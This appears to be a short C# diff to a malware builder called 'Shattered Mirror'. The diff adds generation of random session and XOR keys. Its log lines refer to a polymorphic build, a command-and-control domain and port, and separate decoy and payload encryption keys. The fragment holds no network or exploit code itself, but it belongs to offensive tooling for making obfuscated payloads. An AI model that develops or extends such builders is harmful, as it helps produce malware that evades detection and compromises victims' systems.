@@ -42,6 +42,11 @@ namespace ShatteredMirror_Builder
             Log("[+] Finalizing Shattered Mirror Polymorphic Build...");
             Log($"[*] C2 Target: {_c2Domain}:{_c2Port}");
 
+            // Generate building-specific cryptographic keys
+            string sessionKey = GenerateRandomString(16);
+            string xorKey = GenerateRandomString(12);
+            string payloadXorKey = GenerateRandomString(16);
+
             Log($"[*] Generated session key: {sessionKey}");
             Log($"[*] Generated XOR key (Decoy): {xorKey}");
             Log($"[*] Generated XOR key (Payload): {payloadXorKey}");
